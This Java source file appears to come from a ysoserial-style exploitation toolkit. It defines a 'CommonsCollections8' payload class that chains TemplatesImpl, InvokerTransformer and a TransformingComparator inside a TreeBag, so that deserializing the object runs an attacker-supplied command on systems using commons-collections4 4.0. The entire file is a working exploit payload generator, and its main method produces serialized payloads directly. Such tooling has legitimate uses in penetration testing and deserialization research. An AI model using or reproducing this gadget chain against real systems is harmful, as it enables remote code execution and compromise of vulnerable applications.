package org.su18.ysuserial.payloads;

import java.util.Comparator;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})
public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<TreeBag> {

    public TreeBag getObject(String command) throws Exception {
        Object                 templates   = Gadgets.createTemplatesImpl(command);
        InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
        TreeBag                tree        = new TreeBag((Comparator) comp);
        tree.add(templates);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections8.class, args);
    }
}
